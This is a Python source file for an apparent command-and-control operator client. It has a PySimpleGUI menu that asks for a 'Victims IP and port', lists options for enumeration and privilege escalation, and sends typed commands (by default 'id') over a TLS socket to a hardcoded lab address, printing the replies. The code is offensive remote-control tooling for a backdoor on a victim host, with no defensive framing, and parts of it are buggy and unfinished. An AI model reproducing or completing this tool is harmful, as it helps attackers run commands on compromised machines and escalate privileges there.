import socket
import ssl
import PySimpleGUI as sg

def menu(cert ,key, host ,port):
    # Define the window's contents
    layout = [[sg.Text('Not connected', background_color='red',key='-OUT-')],
             [sg.Checkbox('Setup', size=(100,1))],
             [sg.Checkbox('Enumeration', auto_size_text=True)],
             [sg.Checkbox('Basic Commands', auto_size_text=True)],
             [sg.Checkbox('Privelge Escalation', auto_size_text=True)],

             [sg.Button('Ok'), sg.Button('Quit')]]

    # Create the window
    window = sg.Window('MAIN MENU', layout)

    # Display and interact with the Window using an Event Loop
    while True:
        event, values = window.read()
        # See if user wants to quit or window was closed
        if event == sg.WINDOW_CLOSED or event == 'Quit':
            break
        elif ((values[0]==True) and (host ==0)):
            options=setup()
            host=options[0]
            port=options[1]
            window['-OUT-'].update('connected:ip:'+str(host)+' and port:'+str(port), background_color='green')  # show the event and values in the window
            window.refresh()
        elif (values[0]==False and (host ==0)):
            window['-OUT-'].update('Not connected', background_color='red')  # show the event and values in the window
            window.refresh()
        elif (values[1]==True):
            interact(key ,host ,port ,data)
        elif (values[2]==True):
            interact_GUI(cert , host ,port)
    # Finish up by removing from the screen
    window.close()
def interact_GUI(key ,host ,port):
    sg.theme('DarkGrey14')

    layout = [
        [sg.Text('Script/Commands to execute', size=(40, 1))],
        [sg.Output(size=(88, 20), font='Courier 10')],
        [sg.Button('script1'), sg.Button('script2'), sg.Button('EXIT')],
        [sg.Text('Manual command', size=(15, 1)), sg.Input(focus=True, key='-IN-'), sg.Button('Run', bind_return_key=True), sg.Button('Run No Wait')]
    ]

    window = sg.Window('Script launcher', layout)

    # ---===--- Loop taking in user input and using it to call scripts --- #

    while True:
        event, values = window.read()
        if event == 'EXIT'  or event == sg.WIN_CLOSED:
            break # exit button clicked
        if event == 'script1':
            sp = sg.Window('My Script',
                        [[sg.Text('Document to open')],
                        [sg.In(), sg.FileBrowse()],
                        [sg.Open(), sg.Cancel()]]).read(close=True)[1][0]
        elif event == 'script2':
            sg.Window('My Script',
                        [[sg.Text('Document to open')],
                        [sg.In(), sg.FileBrowse()],
                        [sg.Open(), sg.Cancel()]]).read(close=True)[1][0]
        elif event == 'Run':
            args = values['-IN-'].split(' ')
            print(f'Running {values["-IN-"]} args={args[0]}')
            interact(key ,host ,port ,args[0])
        elif event == 'Run No Wait':
            args = values['-IN-'].split(' ')
            print(f'Running {values["-IN-"]} args={args}', 'Results will not be shown')
            sp = sg.execute_command_subprocess(args[0], *args[1:])
def setup():   
    sg.theme('Topanga')      # Add some color to the window

    # Very basic window.  Return values using auto numbered keys

    layout = [
        [sg.Text('Please enter your Victims IP and port to run')],
        [sg.Text('Vicims IP', size=(15, 1)), sg.InputText()],
        [sg.Text('Port', size=(15, 1)), sg.InputText()],
        [sg.Submit(), sg.Cancel()]
    ]

    window = sg.Window('Simple data entry window', layout)
    event, values = window.read()
    window.close()
    test=values[0]
    test2=values[1]

    return test,test2

def interact(key ,host ,port ,data="id"):

    #Needs cert and key generated:
    #openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365


    context = ssl.SSLContext() #Defaults to TLS 
    context.verify_mode = ssl.CERT_REQUIRED
    context.load_verify_locations('./cert.pem')
    with socket.create_connection((host, port)) as sock:
        #Create secure socket
        ssock=context.wrap_socket(sock, server_hostname=host)
        print(ssock.version())
        print(ssock.getpeercert())
        ssock.send(data.encode())
        recieve = ssock.recv(1024)
        print(f"Recieved: {recieve}")
        ssock.shutdown(2) #Nicely close the encrypted channel
def get_host_info(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    host=(s.getsockname()[0])
    s.close()
    return host
if __name__=="__main__":
    port = 4000
    host= '192.168.237.129'
    cert="./cert.pem"
    key="./key.pem"
#    menu(cert ,key, host ,port)
    interact(key ,host ,port)
#    setup_list=setup()
#    host=setup_list[0]
#    port=setup_list[1]